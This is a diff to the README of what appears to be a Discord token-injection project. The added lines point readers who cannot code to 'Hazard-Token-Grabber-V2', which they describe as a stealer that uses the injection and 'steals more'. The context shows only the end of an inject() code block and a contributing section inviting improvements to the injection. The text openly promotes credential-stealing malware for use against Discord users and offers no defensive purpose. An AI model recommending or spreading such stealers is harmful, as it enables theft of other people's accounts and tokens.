@@ -110,6 +110,9 @@ if __name__ == "__main__":
     inject()
 ```
 
+## 🎉・Want to use it but don't know shit about coding?
+No worries, [Hazard-Token-Grabber-V2](https://github.com/Rdimo/Hazard-Token-Grabber-V2) is a stealer that uses this injection + steals more!
+
 ## 🤝・Contributing
 
 Any ideas on how to improve the injection? Or just think you got something you want to see being added? [Open a new issue](https://github.com/rdimo/Discord-injection/issues)!
